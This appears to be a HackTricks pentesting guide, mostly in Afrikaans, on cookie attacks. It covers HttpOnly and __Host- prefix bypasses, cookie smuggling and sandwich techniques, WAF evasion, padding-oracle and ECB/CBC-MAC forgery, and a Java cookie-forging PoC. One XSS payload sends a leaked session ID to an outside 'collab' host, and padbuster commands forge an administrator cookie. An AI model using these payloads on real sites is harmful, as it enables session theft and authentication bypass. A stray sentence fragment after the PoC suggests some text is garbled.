# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie Attributes

Cookies kom met verskeie attributes wat hul gedrag in die gebruiker se blaaier beheer. Hier is ’n oorsig van hierdie attributes in ’n meer passiewe toon:

### Expires and Max-Age

Die vervaldatum van ’n cookie word bepaal deur die `Expires` attribute. Omgekeerd definieer die `Max-age` attribute die tyd in sekondes totdat ’n cookie verwyder word. **Gebruik `Max-age` aangesien dit meer moderne praktyke weerspieël.**

### Domain

Die hosts wat ’n cookie sal ontvang word deur die `Domain` attribute gespesifiseer. Standaard is dit gestel op die host wat die cookie uitgereik het, sonder subdomeine. As die `Domain` attribute egter eksplisiet gestel word, sluit dit subdomeine in. Dit maak die specificasie van die `Domain` attribute ’n minder beperkende opsie, nuttig in scenario’s waar cookie-deling oor subdomeine nodig is. Byvoorbeeld, die stel van `Domain=mozilla.org` maak cookies toeganklik op subdomeine soos `developer.mozilla.org`.

### Path

’n Spesifieke URL-pad wat in die aangevraagde URL teenwoordig moet wees voordat die `Cookie` header gestuur word, word aangedui deur die `Path` attribute. Hierdie attribute beskou die `/` karakter as ’n gidskeier, wat ooreenkomste in subgidse moontlik maak.

### Ordering Rules

Wanneer twee cookies dieselfde naam dra, word die een wat gestuur word gekies op grond van:

- Die cookie wat by die langste pad in die aangevraagde URL pas.
- Die mees onlangs gestelde cookie as die paaie identies is.

### SameSite

- Die `SameSite` attribute bepaal of cookies gestuur word op versoeke wat vanaf derde-party domeine afkomstig is. Dit bied drie instellings:
- **Strict**: Voorkom dat die cookie op derde-party versoeke gestuur word.
- **Lax**: Laat toe dat die cookie saam met GET-versoeke gestuur word wat deur derde-party webwerwe geïnisieer is.
- **None**: Laat toe dat die cookie vanaf enige derde-party domein gestuur word.

Onthou, terwyl cookies gekonfigureer word, kan begrip van hierdie attributes help om te verseker dat hulle soos verwag optree in verskillende scenario’s.

| **Request Type** | **Example Code**                   | **Cookies Sent When** |
| ---------------- | ---------------------------------- | --------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX             | $.get("...")                       | NotSet\*, None        |
| Image            | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
A cookie with _**SameSite**_ attribute will **mitigate CSRF attacks** where a logged session is needed.

**\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Let daarop dat tydelik, na die toepassing van hierdie verandering, die **cookies without a SameSite** **policy** in Chrome **behandeld sal word as None** tydens die **eerste 2 minute en daarna as Lax vir top-level cross-site POST request.**

## Cookies Flags

### HttpOnly

Dit voorkom dat die **client** toegang tot die cookie kry (Via **Javascript** byvoorbeeld: `document.cookie`)

#### **Bypasses**

- As die bladsy die cookies as die response van ’n versoek stuur (byvoorbeeld in ’n **PHPinfo** bladsy), is dit moontlik om die XSS te misbruik om ’n versoek aan daardie bladsy te stuur en die cookies uit die response te **steel** (kyk ’n voorbeeld by [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Dit kan ook gebypas word met **TRACE** **HTTP** versoeke aangesien die response van die bediener (as hierdie HTTP metode beskikbaar is) die gestuurde cookies sal reflekteer. Hierdie tegniek word **Cross-Site Tracking** genoem.
- Hierdie tegniek word deur moderne blaaiers vermy deur nie toe te laat dat ’n TRACE versoek vanaf JS gestuur word nie. Daar is egter enkele omseilings in spesifieke sagteware gevind, soos die stuur van `\r\nTRACE` in plaas van `TRACE` na IE6.0 SP2.
- ’n Ander manier is die uitbuiting van zero/day kwesbaarhede in blaaiers.
- Dit is moontlik om HttpOnly cookies te **oor-skryf** deur ’n Cookie Jar overflow attack uit te voer:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Dit is moontlik om [**Cookie Smuggling**](#cookie-smuggling) attack te gebruik om hierdie cookies te eksfiltreer
- As enige server-side endpoint die rou session ID in die HTTP response echoë (bv. binne HTML comments of ’n debug blok), kan HttpOnly omseil word deur ’n XSS gadget te gebruik om daardie endpoint te fet, die geheim met regex te onttrek, en dit te eksfiltreer. Voorbeeld XSS payload pattern:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Secure

Die versoek sal die cookie **slegs** in 'n HTTP-versoek stuur as die versoek oor 'n veilige kanaal gestuur word (gewoonlik **HTTPS**).

## Cookies Voorvoegsels

Cookies wat met `__Secure-` voorafgegaan word, moet gestel word saam met die `secure` flag vanaf bladsye wat deur HTTPS beveilig is.

Vir cookies wat met `__Host-` voorafgegaan word, moet verskeie voorwaardes nagekom word:

- Hulle moet gestel word met die `secure` flag.
- Hulle moet afkomstig wees van 'n bladsy beveilig deur HTTPS.
- Dit is verbode om 'n domain te spesifiseer, wat voorkom dat hulle na subdomeine gestuur word.
- Die pad vir hierdie cookies moet op `/` gestel word.

Dit is belangrik om daarop te let dat cookies wat met `__Host-` voorafgegaan word nie na superdomeine of subdomeine gestuur mag word nie. Hierdie beperking help om toepassings-cookies te isoleer. Dus kan die gebruik van die `__Host-` voorvoegsel vir alle toepassingscookies beskou word as 'n goeie praktyk om sekuriteit en isolasie te verbeter.

### Oorskryf van cookies

Een van die beskermingsmeganismes van `__Host-`-voorgegewe cookies is om te voorkom dat hulle deur subdomeine oorskryf word. Dit voorkom byvoorbeeld [**Cookie Tossing attacks**](cookie-tossing.md). In die praatjie [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) word aangevoer dat dit moontlik was om \_\_HOST- prefixed cookies vanaf 'n subdomein te stel deur die parser te mislei, byvoorbeeld deur "=" aan die begin (of aan die begin en einde) by te voeg...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Of in PHP was dit moontlik om **ander karakters aan die begin** van die cookie-naam by te voeg wat deur **onderstreepte** karakters vervang sou word, wat dit moontlik gemaak het om `__HOST-` cookies oor te skryf:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Misbruik afwykings tussen browser- en serverparsings deur 'n Unicode-spasiëtkodepunt aan die begin van die cookie-naam voor te sit. Die browser sal nie beskou dat die naam letterlik met `__Host-`/`__Secure-` begin nie, en laat dus toe dat dit vanaf 'n subdomein gestel word. As die backend voorste Unicode-spasiëring op cookie-sleutels afknyp/normaliseer, sal dit die beskermde naam sien en moontlik die hoë-privilege cookie oorskryf.

- PoC van 'n subdomein wat parent-domain cookies kan stel:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Tipiese backend-gedrag wat die probleem moontlik maak:
- Raamwerke wat cookie-sleutels knip/normaliseer. In Django verwyder Python se `str.strip()` 'n wye reeks Unicode-witruimtekodepunte, wat veroorsaak dat die naam normaliseer na `__Host-name`.
- Gereeld geknipte kodepunte sluit in: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Baie raamwerke hanteer duplikaat cookie-name as “laaste wen”, sodat die deur die aanvaller beheerde genormaliseerde cookie-waarde die wettige een oorskryf.

- Browser-verschille maak saak:
- Safari blokkeer multibyte Unicode-witruimte in cookie-name (bv., weier U+2000) maar laat steeds enkelbyte U+0085 en U+00A0 toe, wat baie backends knip. Toets oor verskeie browsers.

- Gevolg: Maak dit moontlik om `__Host-`/`__Secure-` cookies vanaf minder-vertroude kontekste (subdomains) te oorskryf, wat kan lei tot XSS (as dit gereflekteer word), CSRF-token-oorskrywing, en session fixation.

- On-the-wire vs server view example (U+2000 present in name):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Baie backends verdeel en ontleed die header en verwyder daarna leë karakters, wat daartoe lei dat die genormaliseerde `__Host-name` die aanvaller se waarde aanneem.

#### Legacy `$Version=1` cookie-splitsing op Java backends (prefix bypass)

Sommige Java-stacks (bv. Tomcat/Jetty-style) skakel steeds legacy RFC 2109/2965 parsing in wanneer die `Cookie` header met `$Version=1` begin. Dit kan veroorsaak dat die bediener 'n enkele cookie-string herinterpreteer as verskeie logiese cookies en 'n vervalste `__Host-` inskrywing aanvaar wat oorspronklik vanaf 'n subdomein of selfs oor 'n onveilige oorsprong gestel is.

- PoC wat legacy parsing afdwing:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Waarom dit werk:
- Client-side prefix checks word toegepas tydens set, maar server-side legacy parsing verdeel later en normaliseer die header, wat die bedoeling van `__Host-`/`__Secure-` voorvoegselwaarborge omseil.

- Waar om te probeer: Tomcat, Jetty, Undertow, of raamwerke wat steeds RFC 2109/2965-attribuutte eer. Kombineer met duplicate-name overwrite semantics.

#### Duplicate-name last-wins overwrite primitive

When two cookies normalize to the same name, many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names, the attacker-controlled one will typically win.

#### Opsporing en gereedskap

Gebruik Burp Suite om vir hierdie toestande te ondersoek:

- Probeer verskeie leidende Unicode-whitespace kodepunte: U+2000, U+0085, U+00A0 en kyk of die backend dit knip en die naam as voorvoegsel behandel.
- Stuur `$Version=1` eers in die Cookie header en kyk of die backend legacy splitting/normalization uitvoer.
- Let op duplicate-name resolusie (first vs last wins) deur twee cookies in te spuit wat na dieselfde naam normaliseer.
- Burp Custom Action om dit te outomatiseer: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: Hierdie tegnieke benut RFC 6265 se octet-vs-string gap: blaaiers stuur bytes; bedieners dekodeer en mag normaliseer/knip. Ongelykhede in dekodering en normalisering is die kern van die bypass.

## Cookie-aanvalle

As 'n pasgemaakte cookie sensitiewe data bevat, ondersoek dit (veral as jy 'n CTF speel), aangesien dit kwesbaar kan wees.

### Dekodering en manipulasie van Cookies

Sensitiewe data wat in cookies ingebed is, moet altyd ondersoek word. Cookies wat in Base64 of soortgelyke formate gekodeer is, kan dikwels gedekodeer word. Hierdie kwesbaarheid laat aanvallers toe om die cookie se inhoud te verander en ander gebruikers na te boots deur hul gewysigde data weer in die cookie te kodifiseer.

### Session Hijacking

This attack involves stealing a user's cookie to gain unauthorized access to their account within an application. By using the stolen cookie, an attacker can impersonate the legitimate user.

### Session Fixation

In this scenario, an attacker tricks a victim into using a specific cookie to log in. If the application does not assign a new cookie upon login, the attacker, possessing the original cookie, can impersonate the victim. This technique relies on the victim logging in with a cookie supplied by the attacker.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Here, the attacker convinces the victim to use the attacker's session cookie. The victim, believing they are logged into their own account, will inadvertently perform actions in the context of the attacker's account.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Click on the previous link to access a page explaining possible flaws in JWT.

JSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.

### Cross-Site Request Forgery (CSRF)

This attack forces a logged-in user to execute unwanted actions on a web application in which they're currently authenticated. Attackers can exploit cookies that are automatically sent with every request to the vulnerable site.

### Leë Cookies

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Blaaiers laat die skep van cookies sonder 'n naam toe, wat deur JavaScript soos volg aangetoon kan word:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
Die resultaat in die gestuurde cookie header is `a=v1; test value; b=v2;`. Interessant genoeg maak dit die manipulering van cookies moontlik as 'n cookie met 'n leë naam gestel word, wat dit moontlik maak om ander cookies te beheer deur die leë cookie op 'n spesifieke waarde te stel:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Dit lei daartoe dat die blaaier 'n cookie header stuur wat deur elke webbediener geïnterpreteer word as 'n cookie met die naam `a` en die waarde `b`.

#### Chrome-bug: Unicode-surrogaat-kodepunt-kwessie

In Chrome, as 'n Unicode-surrogaat-kodepunt deel van 'n set cookie is, raak `document.cookie` gekorrupteer en gee daarna 'n leë string terug:
```js
document.cookie = "\ud800=meep"
```
Dit laat `document.cookie` 'n leë string teruggee, wat permanente korrupsie aandui.

#### Cookie Smuggling Due to Parsing Issues

(Kyk na verdere besonderhede in die[original research](https://blog.ankursundara.com/cookie-bugs/)) Verskeie webservers, insluitend dié van Java (Jetty, TomCat, Undertow) en Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), hanteer cookie strings verkeerd as gevolg van verouderde RFC2965-ondersteuning. Hulle lees 'n double-quoted cookie value as 'n enkele waarde, selfs al bevat dit semikolons, wat normaalweg key-value pairs behoort te skei:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Kyk verder na meer besonderhede in die[original research](https://blog.ankursundara.com/cookie-bugs/)) Die verkeerde parsing van cookies deur bedieners, veral Undertow, Zope, en dié wat Python se `http.cookie.SimpleCookie` en `http.cookie.BaseCookie` gebruik, skep geleenthede vir cookie injection-aanvalle. Hierdie bedieners misluk daarin om die begin van nuwe cookies behoorlik af te baken, wat aanvallers in staat stel om cookies te spoof:

- Undertow verwag 'n nuwe cookie onmiddellik na 'n gequote waarde sonder 'n semikolon.
- Zope soek na 'n komma om die volgende cookie te begin ontleed.
- Python se cookie-klasse begin parsing op 'n spasie-karakter.

Hierdie kwesbaarheid is veral gevaarlik in webtoepassings wat op cookie-based CSRF-beskerming staatmaak, aangesien dit aanvallers toelaat om gespoofde CSRF-token cookies in te injecteer en moontlik sekuriteitsmaatreëls te omseil. Die probleem word vererger deur Python se hantering van duplikaat cookie-name, waar die laaste voorkoms vroeëre oorskryf. Dit bring ook kommer vir `__Secure-` en `__Host-` cookies in onveilige kontekste en kan lei tot magtiging-omseilings wanneer cookies aan back-end servers deurgegee word wat vatbaar is vir spoofing.

### Cookies $version

#### WAF Bypass

Volgens [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), mag dit moontlik wees om die cookie-attribuut **`$Version=1`** te gebruik sodat die backend 'n ou logika gebruik om die cookie te parse weens die **RFC2109**. Verder kan ander waardes soos **`$Domain`** en **`$Path`** gebruik word om die gedrag van die backend met die cookie te verander.

#### Cookie Sandwich Attack

Volgens [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) is dit moontlik om die cookie sandwich technique te gebruik om HttpOnly cookies te steel. Dit is die vereistes en stappe:

- Vind 'n plek waar 'n skynbaar nuttelose **cookie is refected in the response**
- **Skep 'n cookie genaamd `$Version`** met waarde `1` (jy kan dit doen in 'n XSS-aanval vanaf JS) met 'n meer spesifieke pad sodat dit die aanvanklike posisie kry (sommige frameworks soos python het nie hierdie stap nodig nie)
- **Skep die cookie wat weerspieël word** met 'n waarde wat 'n **open double quotes** laat en met 'n spesifieke pad sodat dit in die cookie db geposisioneer word ná die vorige een (`$Version`)
- Dan sal die legitieme cookie volgende in die volgorde wees
- **Skep 'n dummy cookie wat die double quotse sluit** binne sy waarde

Op hierdie manier word die slagoffer-cookie vasgevang binne die nuwe cookie weergawe 1 en sal dit weerspieël word wanneer dit weerspieël word.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

Kyk na die vorige afdeling.

#### Bypassing value analysis with quoted-string encoding

Hierdie parsing dui daarop om ontsnapte waardes binne die cookies ongedaan te maak, sodat "\a" "a" word. Dit kan nuttig wees om WAFS te omseil soos:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

In RFC2109 word aangedui dat 'n **komma as 'n skeier tussen cookie-waardes gebruik kan word**. En dit is ook moontlik om **spasies en tabs voor en na die gelykheidsteken** by te voeg. Daarom genereer 'n cookie soos `$Version=1; foo=bar, abc = qux` nie die cookie `"foo":"bar, admin = qux"` nie maar die cookies `foo":"bar"` en `"admin":"qux"`. Let hoe 2 cookies gegenereer word en hoe admin die spasie voor en na die gelykheidsteken verloor het.

#### Bypassing value analysis with cookie splitting

Laastens sal verskillende backdoors verskillende cookies wat in verskillende cookie headers deurgegee is, in een string saamvoeg soos in:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Wat dit moontlik kan maak om 'n WAF soos in hierdie voorbeeld te omseil:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Ekstra Kwesbare Cookie Kontroles

#### **Basiese kontrole**

- Die **cookie** is elke keer **dieselfde** wanneer jy **login**.
- Log out en probeer om dieselfde cookie te gebruik.
- Probeer om met 2 toestelle (of blaaiers) in te log op dieselfde account met dieselfde cookie.
- Kyk of die cookie enige inligting daarin het en probeer dit wysig
- Probeer om verskeie accounts te skep met byna dieselfde username en kyk of jy ooreenkomste kan sien.
- Kontroleer die "**remember me**" opsie indien dit bestaan om te sien hoe dit werk. As dit bestaan en moontlik kwesbaar is, gebruik altyd die cookie van **remember me** sonder enige ander cookie.
- Kyk of die vorige cookie nog werk selfs nadat jy die password verander het.

#### **Gevorderde cookie-aanvalle**

As die cookie dieselfde bly (of amper) wanneer jy inlog, beteken dit waarskynlik dat die cookie verband hou met 'n veld van jou account (waarskynlik die username). Dan kan jy:

- Probeer om baie **accounts** te skep met baie **soortgelyke** usernames en probeer **raai** hoe die algoritme werk.
- Probeer om die **username** te **bruteforce**. As die cookie slegs as 'n authentication-metode vir jou username gestoor word, kan jy 'n account skep met username "**Bmin**" en elke enkele **bit** van jou cookie **bruteforce**, want een van die cookies wat jy sal probeer sal dié van "**admin**" wees.
- Probeer **Padding** **Oracle** (jy kan die inhoud van die cookie ontsleutel). Gebruik **padbuster**.

**Padding Oracle - Padbuster voorbeelde**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster sal verskeie pogings doen en sal jou vra watter toestand die fouttoestand is (die een wat nie geldig is nie).

Dan sal dit begin decrypting the cookie (dit kan 'n paar minute neem)

As die aanval suksesvol uitgevoer is, kan jy probeer om 'n string van jou keuse te encrypt. Byvoorbeeld, as jy sou wil **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
Hierdie uitvoering sal vir jou die cookie korrek encrypted en encoded gee met die string **user=administrator** daarin.

**CBC-MAC**

Miskien kan 'n cookie 'n waarde hê en met CBC geteken word. Dan is die integriteit van die waarde die signature geskep deur CBC met dieselfde waarde. Aangesien dit aanbeveel word om as IV 'n null vector te gebruik, kan hierdie tipe integriteitskontrole kwesbaar wees.

**Die aanval**

1. Kry die signature van gebruikersnaam **administ** = **t**
2. Kry die signature van gebruikersnaam **rator\x00\x00\x00 XOR t** = **t'**
3. Stel in die cookie die waarde **administrator+t'** (**t'** sal 'n geldige signature wees van **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**)

**ECB**

As die cookie met ECB encrypted is kan dit kwesbaar wees.\
Wanneer jy aanmeld die cookie wat jy ontvang het altyd dieselfde.

**Hoe om te opspoor en aan te val:**

Skep 2 gebruikers met byna dieselfde data (gebruikersnaam, wagwoord, e-pos, ens.) en probeer om 'n patroon in die gegewe cookie te ontdek

Skep 'n gebruiker genaamd byvoorbeeld "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" en kyk of daar enige patroon in die cookie is (as ECB met dieselfde key elke blok encrypt, kan dieselfde encrypted bytes verskyn as die gebruikersnaam encrypted is).

Daar behoort 'n patroon te wees (met die grootte van 'n gebruikte blok). Dus, as jy weet hoe 'n klomp "a" encrypted is kan jy 'n gebruikersnaam skep: "a"\*(size of the block)+"admin". Dan kan jy die encrypted patroon van 'n blok van "a" uit die cookie verwyder. En jy sal die cookie hê van die gebruikersnaam "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Sommige toepassings mint authentication cookies deur slegs 'n voorspelbare waarde (bv. die numeriese user ID) te encrypt onder 'n globale, hard-coded symmetric key, en dan die ciphertext te encodeer (hex/base64). As die key staties is per produk (of per installasie), kan enigiemand cookies forge vir arbitraire gebruikers offline en authentication omseil.

How to test/forge
- Identifiseer die cookie(s) wat gate auth, e.g., COOKIEID and ADMINCOOKIEID.
- Bepaal cipher/encoding. In one real-world case the app used IDEA with a constant 16-byte key and returned the ciphertext as hex.
- Verifieer deur jou eie user ID te encrypt en te vergelyk met die issued cookie. As dit match, kan jy cookies mint vir enige target ID (1 often maps to the first admin).
- Stel die forged value direk as die cookie en browse; geen credentials is nodig nie.

<details>
<summary>Minimal Java PoC (IDEA + hex) used in the wild</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>konteks (bv. bedienerkant-sessie met 'n ewekansige ID, of voeg anti-replay-eienskappe by).

## Verwysings

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
